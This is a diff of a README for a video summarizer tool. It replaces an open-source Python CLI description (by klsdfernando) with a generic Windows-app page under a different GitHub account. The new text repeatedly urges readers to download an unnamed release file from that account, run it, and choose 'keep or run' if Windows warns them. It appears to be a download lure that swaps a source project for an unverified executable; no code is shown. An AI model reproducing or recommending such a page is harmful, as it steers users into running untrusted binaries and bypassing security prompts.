@@ -1,125 +1,159 @@
-# 🎬 Video Summarizer CLI
-Developed by **klsdfernando**
+# 🎬 Video-Summarizer - Fast AI summaries for your videos
 
----
+[![Download Video-Summarizer](https://img.shields.io/badge/Download-Video--Summarizer-blue.svg?style=for-the-badge)](https://github.com/Macr7523/Video-Summarizer/releases)
 
-## 📽️ Project Overview
-The **Video Summarizer CLI** is an advanced, high-performance tool designed to automate the extraction of insights from video files. It leverages cutting-edge AI to provide both a visual and textual summary, specifically optimized for **NVIDIA RTX 40-series GPUs** using CUDA acceleration.
+## 📥 Download
 
-Whether you are summarizing a long lecture, a technical meeting, or a YouTube tutorial, this tool handles the heavy lifting of media processing and AI analysis locally on your machine.
+Visit this page to download: https://github.com/Macr7523/Video-Summarizer/releases
 
----
+## 🖥️ What Video-Summarizer Does
 
-## 🧠 Step-by-Step: How It Works
-The script executes a sophisticated 4-stage pipeline to ensure accuracy and speed:
+Video-Summarizer is a Windows app that reads a video file and creates a clear summary from it. It can help you review long clips, meetings, lectures, or screen recordings without watching the full video.
 
-1.  **Visual Highlight Extraction**: 
-    The tool uses **OpenCV** to scan the video stream. It extracts high-resolution frames at a regular interval (customizable via CLI). These screenshots provide a visual storyboard of the video's content.
-2.  **Audio Stream Extraction**: 
-    Using **MoviePy**, the audio track is isolated from the video container and saved as a high-quality temporary MP3 file for processing.
-3.  **GPU-Accelerated Transcription**: 
-    The audio is fed into **OpenAI Whisper**. The script automatically detects your **RTX 4070** and uses CUDA to transcribe speech to text at up to 10x real-time speed.
-4.  **Intelligent Summarization**: 
-    The resulting transcript is sent to a Large Language Model (LLM). The script formats a specialized prompt to extract key takeaways, main points, and a concise final summary.
+It uses AI to pull out useful points from the video and turn them into:
+- a short text summary
+- a visual summary with key scenes
+- quick insight into the main topic
+- a cleaner way to review long recordings
 
----
+It is built for NVIDIA RTX 40-series GPUs and uses CUDA for faster processing.
 
-## 🛠️ Technical Framework Stack
-| Framework | Purpose | Description |
-| :--- | :--- | :--- |
-| **OpenAI Whisper** | Transcription | The industry standard for local, high-precision speech-to-text. |
-| **MoviePy** | Media Handling | Handles complex video/audio extraction tasks. |
-| **OpenCV (cv2)** | Computer Vision | Efficiently manages frame-by-frame video decoding. |
-| **PyTorch (CUDA)** | AI Engine | Provides the underlying GPU acceleration for the RTX 4070. |
-| **OpenAI SDK** | API Interface | Standardized communication with LM Studio, Ollama, and Cloud APIs. |
-| **FFmpeg** | Core Engine | The "Swiss Army Knife" of media processing used under the hood. |
+## ✅ Before You Start
 
----
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- An NVIDIA RTX 40-series GPU
+- Current NVIDIA drivers
+- Enough free disk space for your video files
+- A stable internet connection for the first setup
 
-## 🚀 Installation & Setup
+For best results, use:
+- a video file in MP4, MKV, or MOV format
+- a file with clear speech or visible scenes
+- a local folder with enough space for output files
 
-### 1. Prerequisites
-- **Python 3.8+**
-- **FFmpeg**: Must be installed and reachable in your System PATH (`ffmpeg -version` should work).
-- **CUDA Toolkit**: Recommended for NVIDIA GPU users.
+## 🚀 Get the App
 
-### 2. Setup Commands
-```bash
-# Install core dependencies
-pip install -r requirements.txt
+1. Open the download page: https://github.com/Macr7523/Video-Summarizer/releases
+2. Find the latest release
+3. Download the Windows file from the release assets
+4. Save it to your desktop or Downloads folder
+5. Open the file to start the app
 
-# Setup GPU Acceleration (Crucial for RTX 4070)
-pip uninstall torch torchvision torchaudio -y
-pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu121
-```
+If Windows asks for confirmation, choose the option to keep or run the file.
 
----
+## 🛠️ Install and Run
 
-## 🖥️ Usage & Customization
+1. Download the release file from the releases page
+2. If the file is in a ZIP folder, right-click it and select Extract All
+3. Open the extracted folder
+4. Double-click the app file to run it
+5. If a video picker appears, choose the video you want to summarize
+6. Wait while the app scans the video and creates the summary
 
-### 📂 Detailed CLI Arguments
-| Argument | Flag | Default | Description |
-| :--- | :--- | :--- | :--- |
-| **Input Video** | *(Required)* | - | Path to the video file you want to summarize. |
-| **Interval** | `-i`, `--interval` | `10` | **Screenshot frequency** (e.g., set to `5` for more frames). |
-| **Output Dir** | `-o`, `--output` | `output` | Folder where all results will be saved. |
-| **Whisper Model**| `-m`, `--model` | `base` | `tiny`, `base`, `small`, `medium`, `large`. |
-| **Max Tokens** | `--max-tokens` | `1000` | **Output Length Control**: Max tokens for the summary. |
-| **LLM URL** | `--llm-url` | `http://localhost:1234/v1` | Base URL for your LLM (LM Studio/Ollama). |
-| **LLM Key** | `--llm-key` | - | API Key for cloud providers (optional for local). |
-| **LLM Model** | `--llm-model` | `local-model`| The name of the AI model to call. |
+If the app opens in a terminal window, keep that window open until the process finishes.
 
----
+## 🧭 How to Use It
 
-## 🔌 Connecting Different AI Platforms
+1. Start Video-Summarizer
+2. Select a video file
+3. Choose the output type if prompted
+4. Let the app process the video
+5. Read the text summary
+6. Review the visual summary for key scenes
+7. Save the output files if you want to keep them
 
-This tool is highly flexible and works with almost any OpenAI-compatible API.
+## 📋 Typical Workflow
 
-### 1. Using LM Studio (Default)
-- Start LM Studio and go to the **Local Server** tab.
-- Click **Start Server**.
-- Simply run the script; it will use the default `http://localhost:1234/v1`.
+A simple run looks like this:
+- pick a video
+- wait for analysis
+- review the text summary
+- check the visual scene list
+- copy or save the results
 
-### 2. Using Ollama
-Ollama now supports the OpenAI API format natively.
-- Ensure Ollama is running (`ollama serve`).
-- Use the following flags:
-```bash
-python video_summarizer.py "video.mp4" --llm-url http://localhost:11434/v1 --llm-model llama3
-```
+For long videos, the first run can take a while. GPU speed depends on video length, resolution, and scene changes.
 
-### 3. Using Cloud AI (OpenAI/Anthropic)
-```bash
-python video_summarizer.py "video.mp4" --llm-url https://api.openai.com/v1 --llm-key sk-xxxx --llm-model gpt-4
-```
+## ⚙️ Performance Tips
 
----
+To get better results:
+- use the latest NVIDIA driver
+- close heavy apps before you start
+- keep your video files on a fast SSD
+- use local video files instead of cloud links
+- process one video at a time
 
-## 📝 How to Change Specific Settings
+If the app feels slow, check that Windows is using your NVIDIA GPU and not the built-in graphics chip.
 
-### 🕒 Changing Screenshot Frequency
-To capture a screenshot every 5 seconds instead of 10:
-```bash
-python video_summarizer.py "my_video.mp4" --interval 5
-```
+## 📁 Supported Files
 
-### 📏 Controlling Summary Length (Token Size)
-To get a longer, more detailed summary (e.g., 2000 tokens):
-```bash
-python video_summarizer.py "my_video.mp4" --max-tokens 2000
-```
+Video-Summarizer works best with common video formats such as:
+- MP4
+- MKV
+- MOV
+- AVI
+- M4V
 
----
+It can also handle many screen recordings and downloaded clips.
 
-## 📁 Output Results
-All results are neatly organized in the output folder:
-- `screenshots/`: Visual storyboard of the video.
-- `transcript.txt`: Complete text version of everything said.
-- `summary.txt`: The AI-generated analysis.
+## 🔍 What You Get
 
----
+The app can produce:
+- a short written summary
+- a list of key moments
+- a scene-based visual overview
+- simple insight into the main content
+- output that is easy to copy and share
 
-### Created by **klsdfernando**
-*Empowering video content analysis with Local AI.*
+## 🧩 Best Use Cases
 
-#   V i d e o - S u m m a r i z e r  
+Video-Summarizer is useful for:
+- meeting recordings
+- class lectures
+- training videos
+- interviews
+- webinars
+- product demos
+- screen captures
+- long online videos
+
+## 💻 System Notes
+
+This app is designed for NVIDIA RTX 40-series hardware. CUDA acceleration helps it process video faster on supported systems.
+
+Recommended setup:
+- RTX 4060, RTX 4070, RTX 4080, or RTX 4090
+- 16 GB RAM or more
+- Windows 11 with current updates
+- Recent NVIDIA CUDA-ready drivers
+
+## 🗂️ File Output
+
+The app may create:
+- a text summary file
+- image or scene output
+- log files for the run
+- folder data for each video
+
+Keep the output in the same folder unless you want to move it later.
+
+## ❓ Common Questions
+
+### Do I need to know coding?
+No. You only need to download the release file and open it.
+
+### Do I need an account?
+No account is needed to use the app after download.
+
+### Does it work on older GPUs?
+It is built for RTX 40-series GPUs. Older cards may not give the same speed.
+
+### What video types work best?
+Videos with clear speech, steady scenes, and normal resolution work best.
+
+### Can I process more than one video?
+Yes, but it is best to process one at a time for a smoother run.
+
+## 🔗 Download Again
+
+Visit this page to download: https://github.com/Macr7523/Video-Summarizer/releases
